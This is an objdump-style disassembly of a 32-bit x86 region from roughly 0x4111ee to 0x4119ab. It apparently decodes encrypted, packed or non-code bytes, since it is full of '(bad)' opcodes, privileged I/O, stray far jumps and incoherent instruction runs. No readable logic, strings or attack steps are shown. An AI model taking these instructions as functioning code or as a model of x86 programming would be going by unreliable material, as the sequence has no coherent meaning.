  4111ee:	lock test DWORD PTR [ecx],ecx
  4111f1:	cmp    ebp,DWORD PTR [edx-0x3c]
  4111f4:	sub    dh,cl
  4111f6:	retf   0x3329
  4111f9:	add    al,0x2
  4111fb:	rcr    ah,cl
  4111fd:	inc    ebp
  4111fe:	cwde   
  4111ff:	mov    BYTE PTR [edx],bl
  411201:	add    BYTE PTR [edi-0x60],dh
  411204:	inc    ecx
  411205:	out    0xa2,eax
  411207:	fstp   QWORD PTR [edx+ecx*1+0x56]
  41120b:	pushaw 
  41120d:	or     eax,0xaada8311
  411212:	stc    
  411213:	sti    
  411214:	sub    BYTE PTR ss:[eax+ebp*1+0x1033ed9c],ch
  41121c:	shl    edx,0xad
  41121f:	inc    ebp
  411220:	ja     0x411219
  411222:	jo     0x4111a8
  411224:	daa    
  411225:	cs dec esp
  411227:	(bad)  
  411228:	xchg   edx,eax
  411229:	inc    ecx
  41122a:	pusha  
  41122b:	test   esp,ecx
  41122d:	stos   DWORD PTR es:[edi],eax
  41122e:	je     0x4112ab
  411230:	les    esi,FWORD PTR [edx-0x73]
  411233:	jmp    0xdf58:0x5e4f587d
  41123a:	(bad)  
  41123b:	or     eax,0x9673b76b
  411240:	mov    WORD PTR [ebp+0x3],ds
  411243:	jb     0x41122b
  411245:	mov    cl,0xbe
  411247:	ja     0x4112c0
  411249:	jnp    0x4111f3
  41124b:	inc    ebx
  41124c:	sbb    eax,0xcfa3ef06
  411251:	imul   esi,DWORD PTR [ecx-0x3e],0x42
  411255:	arpl   WORD PTR [edx],sp
  411257:	fidivr WORD PTR ds:0x62a37492
  41125d:	div    DWORD PTR ds:0x54024b3b
  411263:	mov    ds:0xb37c1167,al
  411268:	(bad)  
  41126a:	jno    0x4112dd
  41126c:	dec    esi
  41126d:	mov    edi,0xbced9cf
  411272:	mov    esp,eax
  411274:	xchg   ebx,eax
  411275:	sbb    ch,BYTE PTR [ecx]
  411277:	inc    ebp
  411278:	sti    
  411279:	dec    edx
  41127a:	fcmovbe st,st(6)
  41127c:	sub    al,0xb9
  41127e:	inc    edx
  41127f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411280:	loopne 0x411259
  411282:	shr    BYTE PTR ds:0x8f81e062,cl
  411288:	rol    BYTE PTR [eax-0x6e],0xe
  41128c:	adc    eax,0x2bf37dac
  411291:	xor    al,0x5d
  411293:	xchg   esi,eax
  411294:	pop    ecx
  411295:	inc    esp
  411296:	mov    ah,0x9e
  411298:	jg     0x411309
  41129a:	jnp    0x41123a
  41129c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41129d:	leave  
  41129e:	int    0xc3
  4112a0:	mov    dl,0xcd
  4112a2:	shr    DWORD PTR [ecx-0xc],0x7e
  4112a6:	add    dh,BYTE PTR [esi+0x185fa435]
  4112ac:	inc    esp
  4112ad:	mov    ds:0x78f9b97f,al
  4112b2:	push   ds
  4112b3:	push   ss
  4112b4:	dec    ecx
  4112b5:	int    0xb
  4112b7:	fistp  QWORD PTR [eax+0x17]
  4112ba:	xchg   DWORD PTR [ebx-0x66da1613],ebx
  4112c0:	bound  edx,QWORD PTR [esi+0x3f]
  4112c3:	je     0x411282
  4112c5:	dec    ebp
  4112c6:	lds    ecx,FWORD PTR [edi-0x12]
  4112c9:	outs   dx,DWORD PTR ds:[esi]
  4112ca:	scas   eax,DWORD PTR es:[edi]
  4112cb:	xchg   esi,eax
  4112cc:	fdivr  QWORD PTR [edx]
  4112ce:	repz stc 
  4112d0:	push   edi
  4112d1:	mov    dl,0xe3
  4112d3:	(bad)  
  4112d4:	mov    bh,0x38
  4112d6:	and    BYTE PTR [edx-0x2a],bh
  4112d9:	pop    ecx
  4112da:	pop    edx
  4112db:	mov    al,ds:0xdda592d3
  4112e0:	push   ds
  4112e1:	dec    esi
  4112e2:	leave  
  4112e3:	into   
  4112e4:	rol    DWORD PTR [esi+edi*8],1
  4112e7:	mov    ebx,0xdef7dd93
  4112ec:	test   BYTE PTR [edx],bl
  4112ee:	sbb    dl,dl
  4112f0:	aad    0x76
  4112f2:	adc    ebp,DWORD PTR [ecx]
  4112f4:	(bad)  
  4112f5:	mov    ebx,0xa8bf78ea
  4112fa:	in     eax,dx
  4112fb:	mov    ebx,0x72f0f55b
  411300:	outs   dx,DWORD PTR ds:[esi]
  411301:	retf   
  411302:	psubsb mm4,QWORD PTR [edi-0x3b]
  411306:	test   DWORD PTR [ebp-0x40],ebp
  411309:	adc    ebp,eax
  41130b:	xchg   esp,eax
  41130c:	cmc    
  41130d:	mov    ?,esi
  41130f:	mov    ecx,ebp
  411311:	or     DWORD PTR [eax+0x3d],ebp
  411314:	scas   al,BYTE PTR es:[edi]
  411315:	pop    ecx
  411316:	ja     0x4112b3
  411318:	out    dx,eax
  411319:	dec    ebx
  41131a:	test   al,0x25
  41131c:	repz mov eax,0xb3c1abe9
  411322:	sub    DWORD PTR [esi-0x1b],ebx
  411325:	and    eax,DWORD PTR [ebp+ebp*4-0x78]
  411329:	mov    ah,0xc6
  41132b:	retf   0x4001
  41132e:	or     al,ch
  411330:	push   eax
  411331:	imul   edi,DWORD PTR [edx+0xf],0x1464f12d
  411338:	or     ch,0x1a
  41133b:	and    DWORD PTR [esi],edi
  41133d:	push   edx
  41133e:	xor    ebx,ebx
  411340:	retf   
  411341:	or     eax,0xf9619a13
  411346:	imul   edx,DWORD PTR ds:0x32a1090e,0x3d
  41134d:	mov    ebp,0xc2c677f3
  411352:	sub    al,0x9c
  411354:	add    eax,0xe44c7247
  411359:	test   eax,esi
  41135b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41135c:	ret    
  41135d:	and    eax,DWORD PTR [edi]
  41135f:	add    BYTE PTR [edi],ah
  411361:	ror    BYTE PTR [ebx],0x1
  411364:	mov    al,0x8f
  411366:	dec    edx
  411367:	add    eax,0xac4cd23f
  41136c:	sub    BYTE PTR [edi],dh
  41136e:	int3   
  41136f:	inc    ebp
  411370:	cmp    ecx,DWORD PTR [edi+0xe28917b]
  411376:	xchg   ebp,eax
  411377:	icebp  
  411378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411379:	adc    DWORD PTR [ebp+0x65976144],ecx
  41137f:	and    DWORD PTR [esi],eax
  411381:	mov    dl,0x59
  411383:	mov    dh,0x6e
  411385:	xor    eax,0xbfb96742
  41138a:	iret   
  41138b:	jae    0x411353
  41138d:	test   BYTE PTR [edx-0x394fcdab],bl
  411393:	or     DWORD PTR [edx],ecx
  411395:	cli    
  411396:	add    al,cl
  411398:	call   0x8a38:0xda4adfc3
  41139f:	mov    bl,0xc9
  4113a1:	jle    0x411373
  4113a3:	mov    ah,0xba
  4113a5:	push   es
  4113a6:	sub    eax,0x881d16c5
  4113ab:	ins    DWORD PTR es:[edi],dx
  4113ac:	sbb    ah,ah
  4113ae:	inc    eax
  4113af:	pop    ecx
  4113b0:	ss xchg esp,eax
  4113b2:	scas   eax,DWORD PTR es:[edi]
  4113b3:	dec    ecx
  4113b4:	sbb    eax,0x52a5c132
  4113b9:	mov    eax,0xc35958ec
  4113be:	aas    
  4113bf:	add    esp,DWORD PTR [esp+edx*8]
  4113c2:	sub    dh,BYTE PTR [edx+0x1a]
  4113c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113c6:	jle    0x411379
  4113c8:	cmp    dl,0x7a
  4113cb:	test   BYTE PTR [edx-0x69],al
  4113ce:	or     esp,DWORD PTR [edi-0x36]
  4113d1:	sub    esp,ebx
  4113d3:	shl    DWORD PTR [ebp-0x6c2e05b0],0x4f
  4113da:	idiv   DWORD PTR [ecx+0x1d]
  4113dd:	jb     0x4113ae
  4113df:	ror    DWORD PTR [esi],cl
  4113e1:	xor    eax,0x4f966241
  4113e6:	or     al,bl
  4113e8:	mov    dl,0x2
  4113ea:	repnz test al,0x3a
  4113ed:	add    edi,DWORD PTR [ebx-0x697e694]
  4113f3:	gs push 0x8e0f477
  4113f9:	std    
  4113fa:	pop    ebx
  4113fb:	popa   
  4113fc:	jmp    0x8d0961df
  411401:	imul   edx,DWORD PTR [edx],0xffffffc1
  411404:	aam    0x72
  411406:	xchg   edi,eax
  411407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411408:	in     al,0xdd
  41140a:	or     BYTE PTR [edi],al
  41140c:	or     bl,BYTE PTR [esi+eax*1-0x57]
  411410:	je     0x4113c9
  411412:	out    0x72,al
  411414:	pop    ds
  411415:	nop
  411416:	push   edx
  411417:	push   esi
  411418:	aaa    
  411419:	(bad)  
  41141a:	out    0xc8,eax
  41141c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41141d:	iret   
  41141e:	jo     0x4113a3
  411420:	in     al,dx
  411421:	mov    bl,0x2c
  411423:	dec    edx
  411424:	xor    esi,DWORD PTR [esi+0x6402a246]
  41142a:	jne    0x411401
  41142c:	inc    ecx
  41142d:	jnp    0x4113e9
  41142f:	popa   
  411430:	aaa    
  411431:	mov    DWORD PTR [edx+0x55],ecx
  411434:	aaa    
  411435:	loop   0x41149a
  411437:	push   0x3da08c0
  41143c:	xlat   BYTE PTR ds:[ebx]
  41143d:	xchg   ebx,eax
  41143e:	pop    edi
  41143f:	xchg   BYTE PTR [ebp-0x5ffcb7bf],al
  411445:	add    BYTE PTR [ebx+0x2e34bea1],bh
  41144b:	clc    
  41144c:	sahf   
  41144d:	neg    BYTE PTR ds:0x419e1e78
  411453:	shl    dl,0x44
  411456:	leave  
  411457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411458:	mov    ebp,0xb8d7e51f
  41145d:	xchg   edi,eax
  41145e:	mov    dh,al
  411460:	push   cs
  411461:	int    0xa5
  411463:	popa   
  411464:	push   ss
  411465:	mov    BYTE PTR [ecx+0x3c],cl
  411468:	(bad)  
  411469:	addr16 mov al,ds:0x8085
  41146d:	or     ebx,ebp
  41146f:	mov    bl,ch
  411471:	xchg   edx,eax
  411472:	mov    ch,0x46
  411474:	xlat   BYTE PTR ds:[ebx]
  411475:	repnz pop ebp
  411477:	lahf   
  411478:	std    
  411479:	aas    
  41147a:	test   DWORD PTR [eax+0x19],esp
  41147d:	jo     0x41146a
  41147f:	mov    ebp,0x41cdb46c
  411484:	and    ebp,edi
  411486:	xchg   edx,eax
  411487:	int    0xb7
  411489:	aam    0x59
  41148b:	xor    bh,dl
  41148d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148e:	xor    bl,dh
  411490:	data16 aaa 
  411492:	inc    edi
  411493:	or     edi,ecx
  411495:	xchg   ebx,eax
  411496:	iret   
  411497:	daa    
  411498:	bound  edi,QWORD PTR [edx-0x52]
  41149b:	sbb    eax,0x966ce77f
  4114a0:	xor    DWORD PTR [eax-0x64968b6b],eax
  4114a6:	fwait
  4114a7:	stc    
  4114a8:	pop    ds
  4114a9:	pop    esp
  4114aa:	adc    dh,BYTE PTR [ebx+0x7d8ca47a]
  4114b0:	loope  0x4114a1
  4114b2:	or     eax,0xfdc03b04
  4114b7:	jb     0x411449
  4114b9:	push   ds
  4114ba:	push   0xedbf0b26
  4114bf:	std    
  4114c0:	adc    dl,BYTE PTR [ecx]
  4114c2:	cmp    edi,DWORD PTR [eax-0xde7d56e]
  4114c8:	jo     0x411533
  4114ca:	add    dl,bh
  4114cc:	sbb    eax,0x3133a5ef
  4114d1:	cmp    cl,BYTE PTR [eax+0x2c]
  4114d4:	inc    edx
  4114d5:	imul   edi,DWORD PTR [ebx+0x7e196c2b],0xffffff96
  4114dc:	in     al,dx
  4114dd:	jnp    0x411483
  4114df:	mov    edx,esi
  4114e1:	adc    DWORD PTR [edi+eax*4-0x1a],ebx
  4114e5:	mov    ah,0xea
  4114e7:	ja     0x411477
  4114e9:	shl    DWORD PTR [eax-0x20],1
  4114ec:	sbb    BYTE PTR [eax],bh
  4114ee:	dec    edi
  4114ef:	push   ebp
  4114f0:	repnz pop esi
  4114f2:	ins    DWORD PTR es:[edi],dx
  4114f3:	cwde   
  4114f4:	es (bad) 
  4114f6:	pop    edi
  4114f7:	add    edi,ebp
  4114f9:	xor    DWORD PTR [edx+ebx*4],0x2385be36
  411500:	cmp    DWORD PTR [esi],0x56
  411503:	mov    fs,WORD PTR [ecx+0x247464ae]
  411509:	enter  0x5ca1,0x90
  41150d:	scas   al,BYTE PTR es:[edi]
  41150e:	scas   al,BYTE PTR es:[edi]
  41150f:	mov    al,ds:0x24e0a3c2
  411514:	popf   
  411515:	and    eax,0x5581c1b4
  41151a:	adc    edi,DWORD PTR [esi+0xff27215]
  411520:	popa   
  411521:	dec    edi
  411522:	aaa    
  411523:	test   al,0x8f
  411525:	cmp    edi,DWORD PTR [edx]
  411527:	wbinvd 
  411529:	out    0x89,eax
  41152b:	pop    ebx
  41152c:	inc    edi
  41152d:	mov    esp,0x8c9064eb
  411532:	push   0xa211cd2b
  411537:	(bad)  
  411538:	pop    edx
  411539:	mov    dh,0x6
  41153b:	fld    TBYTE PTR [esi]
  41153d:	push   0xffffffc1
  41153f:	out    0x58,eax
  411541:	pop    ebp
  411542:	mov    dl,0x15
  411544:	lock mov bh,0x9f
  411547:	popf   
  411548:	mov    dl,0x6b
  41154a:	sbb    bl,BYTE PTR [eax+0x54eda40b]
  411550:	inc    edi
  411551:	jle    0x4114fd
  411553:	mov    al,ds:0x96bd882a
  411558:	mov    esp,0xdf9e88e0
  41155d:	gs jmp 0x2518b52c
  411563:	int    0xcf
  411565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411566:	dec    esi
  411567:	test   DWORD PTR [ebp-0x51],edx
  41156a:	out    dx,eax
  41156b:	ins    DWORD PTR es:[edi],dx
  41156c:	xor    eax,0x992a6324
  411571:	sbb    eax,esi
  411573:	or     eax,0xd48c3906
  411578:	mov    WORD PTR ds:0xc102911e,ds
  41157e:	shr    DWORD PTR [ebp+0x4c769c19],1
  411584:	mov    dh,0x4d
  411586:	mov    edi,0x89acc200
  41158b:	daa    
  41158c:	dec    ebx
  41158d:	test   DWORD PTR [edi+0x6cceec8],0x4b923b86
  411597:	pop    esp
  411598:	repz fstp TBYTE PTR [ecx-0x34ec2e03]
  41159f:	push   eax
  4115a0:	inc    esi
  4115a2:	es push ebp
  4115a4:	inc    edi
  4115a5:	imul   edi,ebx,0x1333a6bb
  4115ab:	rcr    BYTE PTR [ebx+0x22],0x87
  4115af:	ins    BYTE PTR es:[edi],dx
  4115b0:	xchg   edi,eax
  4115b1:	call   0xc278:0xd09832e
  4115b8:	sub    ch,ah
  4115ba:	mov    ebx,0xe9bdb2d7
  4115bf:	xor    DWORD PTR [ecx-0x74],ebp
  4115c2:	lahf   
  4115c3:	xor    DWORD PTR [edx],esi
  4115c5:	mov    cl,0x8c
  4115c7:	adc    DWORD PTR [edx],edx
  4115c9:	test   al,0xfa
  4115cb:	test   eax,0x82102690
  4115d0:	jecxz  0x41159e
  4115d2:	rol    BYTE PTR [ecx+edx*4-0x563f503],cl
  4115d9:	and    eax,0xc783bc55
  4115de:	add    ebp,DWORD PTR [ebp+0x66629b8e]
  4115e4:	mov    bl,0x7e
  4115e6:	inc    esi
  4115e7:	stos   DWORD PTR es:[edi],eax
  4115e8:	push   ebx
  4115e9:	outs   dx,DWORD PTR ds:[esi]
  4115ea:	test   al,0xbd
  4115ec:	ins    BYTE PTR es:[edi],dx
  4115ed:	div    BYTE PTR [ebx]
  4115ef:	xlat   BYTE PTR ds:[ebx]
  4115f0:	cs int3 
  4115f2:	xor    al,0x3c
  4115f4:	push   cs
  4115f5:	inc    ebp
  4115f6:	fwait
  4115f7:	cmp    dl,BYTE PTR [ebp+0x7402bc41]
  4115fd:	inc    esp
  4115fe:	(bad)  
  4115ff:	out    0x13,al
  411601:	xor    DWORD PTR [bx+0x4491],edx
  411606:	ins    DWORD PTR es:[edi],dx
  411607:	ss jb  0x411595
  41160a:	scas   al,BYTE PTR es:[edi]
  41160b:	push   eax
  41160c:	mov    eax,0xebfabe8c
  411611:	mov    cl,0xf1
  411613:	mov    BYTE PTR [edi+0x331b0728],dl
  411619:	pop    eax
  41161a:	jnp    0x41163d
  41161c:	pop    esp
  41161d:	shl    DWORD PTR [ebx],0x7b
  411620:	adc    ch,bh
  411622:	jmp    0x3eb662ce
  411627:	pop    esp
  411628:	jge    0x4115cb
  41162a:	inc    esi
  41162b:	jno    0x4115b6
  41162d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41162e:	test   DWORD PTR [ebx+0x2c3fb37c],ebx
  411634:	hlt    
  411635:	sbb    esi,esp
  411637:	sub    al,0x1c
  411639:	mov    ah,0xb4
  41163b:	push   ecx
  41163c:	mov    ds:0xbcddfc7e,eax
  411641:	and    BYTE PTR ds:0xe4fa52a2,cl
  411647:	mov    ebx,0x2b2e33d6
  41164c:	mov    bl,0xee
  41164e:	(bad)  
  41164f:	jp     0x4115f7
  411651:	into   
  411652:	pusha  
  411653:	sbb    DWORD PTR [eax*2-0x1a6837bf],esi
  41165a:	sbb    al,cl
  41165c:	inc    eax
  41165d:	int    0xd9
  41165f:	xchg   BYTE PTR [edi],bl
  411661:	push   ecx
  411662:	xchg   esp,eax
  411663:	and    eax,0x1da42d99
  411668:	mov    eax,0x377a7b75
  41166d:	ja     0x411626
  41166f:	and    DWORD PTR [esp+ecx*8],ecx
  411672:	ret    0x64f2
  411675:	push   ecx
  411676:	mov    cl,0xef
  411678:	sub    ah,BYTE PTR [edx-0x57]
  41167b:	sbb    DWORD PTR [esi],ebp
  41167d:	inc    ebp
  41167e:	push   es
  41167f:	or     al,0x53
  411681:	fldenv [edi+edx*2]
  411684:	sub    dh,BYTE PTR [eax+0x5d]
  411687:	repz mov ecx,0xd9b65f27
  41168d:	pop    edx
  41168e:	rcl    DWORD PTR [edx-0x47],1
  411691:	mov    edi,0xe9bda595
  411696:	outs   dx,DWORD PTR ds:[esi]
  411697:	daa    
  411698:	push   esp
  411699:	rcl    BYTE PTR [esi],cl
  41169b:	push   ss
  41169c:	sub    ecx,DWORD PTR [ecx+0x7a]
  41169f:	rol    DWORD PTR [edi-0x38],0x1d
  4116a3:	aaa    
  4116a4:	xchg   edx,eax
  4116a5:	and    BYTE PTR [edi-0x5bfca318],bl
  4116ab:	ficomp WORD PTR cs:[edx+0xc]
  4116af:	sbb    al,0xb1
  4116b1:	xor    eax,ecx
  4116b3:	xchg   dl,bl
  4116b5:	shl    BYTE PTR [eax],0xed
  4116b8:	pop    es
  4116b9:	mov    ebx,0x285cd291
  4116be:	int3   
  4116bf:	aaa    
  4116c0:	into   
  4116c1:	popa   
  4116c2:	jecxz  0x411713
  4116c4:	ret    
  4116c5:	mov    esi,0xfb549fa6
  4116ca:	mov    ebp,0x988a5850
  4116cf:	out    0xa9,eax
  4116d1:	and    BYTE PTR [ebx+0x720f6462],dl
  4116d7:	fdiv   st(4),st
  4116d9:	pushf  
  4116da:	pop    esi
  4116db:	enter  0xc53c,0xf1
  4116df:	inc    esi
  4116e0:	test   eax,0x552492bc
  4116e5:	or     DWORD PTR [eax-0x259c1c39],0xfffffff0
  4116ec:	sbb    DWORD PTR [ebp-0x6a],ecx
  4116ef:	pusha  
  4116f0:	and    BYTE PTR [ecx],dh
  4116f2:	jns    0x41172d
  4116f4:	mov    es,WORD PTR [ebx-0x61]
  4116f7:	cmp    ebp,DWORD PTR [eax+ebp*8]
  4116fa:	test   al,0xe5
  4116fc:	(bad)  [ecx]
  4116fe:	cld    
  4116ff:	ins    BYTE PTR es:[edi],dx
  411700:	gs push ebp
  411702:	or     BYTE PTR cs:[ecx],cl
  411705:	outs   dx,BYTE PTR ds:[esi]
  411706:	scas   eax,DWORD PTR es:[edi]
  411707:	adc    ch,al
  411709:	aam    0xaa
  41170b:	fdivr  QWORD PTR [eax+0x3c]
  41170e:	push   ss
  41170f:	sbb    al,bl
  411711:	xlat   BYTE PTR ds:[ebx]
  411712:	mov    edi,0x1ea6293a
  411717:	arpl   sp,si
  411719:	pushf  
  41171a:	sbb    BYTE PTR [edx],cl
  41171c:	xchg   edx,eax
  41171d:	neg    DWORD PTR [ebp+0x26]
  411720:	clc    
  411721:	push   es
  411722:	mov    ds:0x579c961,eax
  411727:	xchg   DWORD PTR [edi],edi
  411729:	out    dx,al
  41172a:	cmp    esp,DWORD PTR ds:0x4f9ca431
  411730:	daa    
  411731:	or     BYTE PTR [edx+eiz*8],bl
  411734:	jno    0x4116fb
  411736:	pop    esp
  411737:	dec    esp
  411738:	inc    ecx
  411739:	inc    edi
  41173a:	mov    eax,ds:0xc61b3815
  41173f:	xor    ah,BYTE PTR [edx+eax*1+0x4]
  411743:	nop
  411744:	into   
  411745:	push   ecx
  411746:	jns    0x41173e
  411748:	mul    DWORD PTR [ebx+0x7a47ef3]
  41174e:	cmp    ah,bl
  411750:	mov    cl,0x79
  411752:	das    
  411753:	pop    ebp
  411754:	popa   
  411755:	push   ds
  411756:	sbb    ebx,DWORD PTR ds:0xb872c48e
  41175c:	ja     0x4116ff
  41175e:	inc    esi
  41175f:	push   edi
  411760:	shl    dl,1
  411762:	jmp    0xc845:0xa9aa94de
  411769:	sub    dh,cl
  41176b:	sub    DWORD PTR [eiz*8+0x6ab71bf],ebp
  411772:	(bad)  
  411774:	xchg   esi,eax
  411775:	push   0x19
  411777:	lahf   
  411778:	ror    eax,0x7d
  41177b:	or     ah,al
  41177d:	xor    ebx,DWORD PTR [eax+0x5b]
  411780:	jecxz  0x41174f
  411782:	fwait
  411783:	inc    esp
  411784:	mov    esp,DWORD PTR [ebx]
  411786:	ds ret 
  411788:	dec    edi
  411789:	pop    ds
  41178a:	adc    DWORD PTR ds:0x117dda33,eax
  411790:	mov    eax,ds:0x60797d3d
  411795:	xor    al,0x83
  411797:	dec    ecx
  411798:	push   esp
  411799:	mov    eax,?
  41179b:	inc    eax
  41179c:	pop    ebp
  41179d:	js     0x411728
  41179f:	mov    ecx,0xa183206d
  4117a4:	inc    esp
  4117a5:	dec    esp
  4117a6:	arpl   WORD PTR [ebx],si
  4117a8:	jl     0x4117d8
  4117aa:	mov    DWORD PTR [ebp+0x5305efc6],0x2016ebd3
  4117b4:	add    dl,BYTE PTR [edi+0x4b35568a]
  4117ba:	xor    DWORD PTR [edx+ebx*2-0x2ba444e3],0xffffffc1
  4117c2:	addr16 jnp 0x411787
  4117c5:	ja     0x4117fd
  4117c7:	xchg   DWORD PTR [eax],esi
  4117c9:	cmp    bh,cl
  4117cb:	mov    bl,0xd0
  4117cd:	sub    dl,BYTE PTR [ebx-0x776ab5e0]
  4117d3:	aaa    
  4117d4:	iret   
  4117d5:	repz iret 
  4117d7:	je     0x4117a8
  4117d9:	les    esp,FWORD PTR [edx]
  4117db:	in     eax,dx
  4117dc:	sbb    dh,BYTE PTR [ecx+0x7d3b8131]
  4117e2:	pop    edi
  4117e3:	mov    ch,0xe7
  4117e5:	shl    al,1
  4117e7:	jb     0x4117c0
  4117e9:	mov    ecx,0xc276025f
  4117ee:	dec    esi
  4117ef:	inc    edi
  4117f0:	mov    bl,0xc
  4117f2:	jecxz  0x41179a
  4117f4:	mov    ebx,?
  4117f6:	outs   dx,BYTE PTR ds:[esi]
  4117f7:	adc    dl,BYTE PTR [eax-0x10]
  4117fa:	dec    eax
  4117fb:	mov    edi,0x17f48e42
  411800:	mov    edx,0x5becc7a5
  411805:	and    al,0x8f
  411807:	or     al,0x7a
  411809:	daa    
  41180a:	cmp    cl,BYTE PTR [edi-0x18]
  41180d:	mov    ds:0x2b0d4c39,al
  411812:	jne    0x411812
  411814:	mov    ebx,0xafe565a8
  411819:	test   eax,0x66c1b777
  41181e:	shr    BYTE PTR [ecx+ebx*1+0x2f],1
  411822:	jg     0x4117f3
  411824:	xor    dh,dh
  411826:	and    BYTE PTR [edx-0x74ac35a4],dh
  41182c:	rol    ah,1
  41182e:	sub    BYTE PTR [ebx-0x51f79f5],0x11
  411835:	xchg   esi,eax
  411836:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411838:	out    0x6,al
  41183a:	mov    edx,0xb5fdd026
  41183f:	mov    dl,0x26
  411841:	jmp    0x4118ac
  411843:	inc    ecx
  411844:	fsubrp st(5),st
  411846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411847:	pop    edi
  411848:	cmp    DWORD PTR [esi+0xe],ebp
  41184b:	outs   dx,BYTE PTR ds:[esi]
  41184c:	jecxz  0x411816
  41184e:	mov    al,0x11
  411850:	jecxz  0x4118ca
  411852:	(bad)
  411856:	fisubr DWORD PTR [ebp+0xa]
  411859:	and    dh,ch
  41185b:	scas   eax,DWORD PTR es:[edi]
  41185c:	sbb    edx,DWORD PTR [edi]
  41185e:	loope  0x411818
  411860:	mov    ebx,0x730912e8
  411865:	xor    ah,BYTE PTR [edi+0x75705d26]
  41186b:	cmp    esi,esp
  41186d:	jmp    0x4118de
  41186f:	cld    
  411870:	mov    cl,cl
  411872:	xchg   esi,eax
  411873:	repnz or ah,BYTE PTR [edx+0x24]
  411877:	shr    esp,0xa7
  41187a:	ss mov bh,0xbe
  41187d:	out    0xc0,eax
  41187f:	sub    esp,DWORD PTR cs:[eax+ebx*4]
  411883:	in     eax,0x34
  411885:	repz and dl,cl
  411888:	mov    edx,0x8790b958
  41188d:	out    0x33,al
  41188f:	arpl   WORD PTR [eax+0x1e552c30],cx
  411895:	lea    edx,[ebp+0xe]
  411898:	clc    
  411899:	mov    edx,0x6030d1b4
  41189e:	mov    ebx,0x779deb3
  4118a3:	rcr    BYTE PTR [ebx-0x76],0xa
  4118a7:	adc    al,0xb1
  4118a9:	mov    bh,0x7
  4118ab:	dec    eax
  4118ac:	or     al,0x6f
  4118ae:	outs   dx,DWORD PTR ds:[esi]
  4118af:	ret    
  4118b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b1:	ja     0x411919
  4118b3:	push   edx
  4118b4:	sbb    bl,BYTE PTR [ebx+edx*8+0x2d]
  4118b8:	mov    esp,0x3d61fb38
  4118bd:	out    dx,eax
  4118be:	fmul   DWORD PTR [edx]
  4118c0:	addr16 mov bh,0x23
  4118c3:	jp     0x4118d8
  4118c5:	ins    DWORD PTR es:[edi],dx
  4118c6:	lea    esi,[edx]
  4118c8:	pop    ebp
  4118c9:	cld    
  4118ca:	pop    edx
  4118cb:	pop    esi
  4118cc:	and    esp,0xe87c30f4
  4118d2:	pop    ebp
  4118d3:	aam    0x2a
  4118d5:	push   esi
  4118d6:	inc    edx
  4118d7:	jns    0x411929
  4118d9:	jl     0x4118fa
  4118db:	xchg   edi,eax
  4118dc:	ds ins BYTE PTR es:[edi],dx
  4118de:	into   
  4118df:	lea    ebx,[edx-0x27d21b37]
  4118e5:	inc    esp
  4118e6:	jecxz  0x411911
  4118e8:	hlt    
  4118e9:	pop    ecx
  4118ea:	mov    esp,0xa0537897
  4118ef:	pusha  
  4118f0:	add    edx,DWORD PTR [edx+0x79]
  4118f3:	mov    al,0xa9
  4118f5:	lahf   
  4118f6:	xchg   DWORD PTR [edx-0x5a],esp
  4118f9:	(bad)  
  4118fa:	callw  0x62bf
  4118fe:	and    BYTE PTR [ebp-0x6138d0b4],0xa7
  411905:	or     ecx,DWORD PTR [esi-0x7c]
  411908:	pop    edi
  411909:	push   esi
  41190a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41190c:	or     ecx,0xfffffffa
  41190f:	js     0x4118fa
  411911:	push   ds
  411912:	mov    ds:0x32ec210f,eax
  411917:	mov    al,ds:0x32f35150
  41191c:	xchg   BYTE PTR [ebx],ch
  41191e:	push   edi
  41191f:	add    al,0x68
  411921:	pop    esi
  411922:	cmp    ecx,esp
  411924:	mov    DWORD PTR [edi],eax
  411926:	das    
  411927:	pop    edi
  411928:	and    DWORD PTR [edi+0x72],ebp
  41192b:	dec    ecx
  41192c:	mov    DWORD PTR [ecx+esi*8-0x262feabf],esi
  411933:	pop    edi
  411934:	jl     0x411991
  411936:	jmp    0x7295:0x3c22570a
  41193d:	frstor [eax+0x1f0ea766]
  411943:	out    dx,eax
  411944:	mov    ebp,0x625c660f
  411949:	xchg   ebx,eax
  41194a:	in     al,dx
  41194b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194c:	push   esp
  41194d:	xchg   ebx,eax
  41194e:	cli    
  41194f:	jle    0x4118f6
  411951:	or     esi,ebx
  411953:	cwde   
  411954:	rdtsc  
  411956:	add    edi,DWORD PTR [edi-0x3d]
  411959:	or     dh,dl
  41195b:	pop    esi
  41195c:	or     DWORD PTR [eax-0x742742f8],ecx
  411962:	pusha  
  411963:	pop    edi
  411964:	mov    esp,0x233b1484
  411969:	or     ch,cl
  41196b:	and    dl,BYTE PTR [eax-0x61]
  41196e:	push   ds
  41196f:	xchg   DWORD PTR [edx+0x6e],edx
  411972:	dec    ecx
  411973:	jmp    DWORD PTR [edx+0x57]
  411976:	scas   al,BYTE PTR es:[edi]
  411977:	add    al,0xd
  411979:	mov    DWORD PTR [edx+0x5f66127a],0x1d7a4f8
  411983:	push   esi
  411984:	std    
  411985:	mov    bh,0x4
  411987:	dec    esi
  411988:	in     al,dx
  411989:	xchg   edx,eax
  41198a:	das    
  41198b:	xlat   BYTE PTR ds:[ebx]
  41198c:	gs scas al,BYTE PTR es:[edi]
  41198e:	cs hlt 
  411990:	xor    DWORD PTR [edi+edx*4+0x51],eax
  411994:	pop    esi
  411995:	pusha  
  411996:	imul   DWORD PTR [eax]
  411998:	pop    eax
  411999:	shl    bh,1
  41199b:	es aas 
  41199d:	addr16 and esp,esp
  4119a0:	ds loopne 0x4119ea
  4119a3:	pop    eax
  4119a4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4119a6:	mov    ebx,0xbe8a3a5d
  4119ab:	into   
